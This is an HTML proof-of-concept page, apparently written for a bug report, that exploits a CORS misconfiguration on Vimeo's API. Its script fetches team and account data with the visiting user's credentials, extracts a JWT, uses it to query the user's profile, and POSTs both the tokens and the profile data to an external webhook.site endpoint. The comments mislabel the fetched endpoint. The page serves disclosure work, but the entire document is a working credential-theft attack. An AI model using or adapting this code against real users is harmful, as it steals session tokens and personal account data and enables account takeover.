<!DOCTYPE html>
<html>
<head>
  <title>Vimeo CORS PoC</title>
</head>
<body>
  <h1>Vimeo CORS Misconfiguration PoC</h1>
  <pre id="output">Loading...</pre>

  <script>
    const exfil = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65"; // replace with your endpoint

    // Step 1: fetch /upload/config with victim's credentials
    fetch("https://api.vimeo.com/users/244943635/teams?&fields=current_team_size,owner.account,owner.name,owner.uri,team_data.team_name,untranslated_user_role", { credentials: "include" })
      .then(r => r.json())
      .then(data => {
        // Show raw config response (contains JWTs)
        document.getElementById("output").innerText = JSON.stringify(data, null, 2);

        // Exfiltrate tokens
        fetch(exfil, {
          method: "POST",
          body: JSON.stringify({ stolen_config: data }),
          headers: { "Content-Type": "application/json" }
        });

        // Step 2: grab main API JWT from response
        const stolenJwt = data?.api?.jwt;
        if (!stolenJwt) throw new Error("No JWT found in /upload/config response");

        // Step 3: use stolen JWT to call another sensitive endpoint (example: /me)
        return fetch("https://api.vimeo.com/me", {
          headers: { "Authorization": "jwt " + stolenJwt }
        });
      })
      .then(r => r.json())
      .then(userData => {
        // Show victim's user info
        document.getElementById("output").innerText += "\n\nUser Info:\n" + JSON.stringify(userData, null, 2);

        // Exfiltrate user info too
        fetch(exfil, {
          method: "POST",
          body: JSON.stringify({ user_info: userData }),
          headers: { "Content-Type": "application/json" }
        });
      })
      .catch(err => {
        document.getElementById("output").innerText = "Error: " + err;
      });
  </script>
</body>
</html>
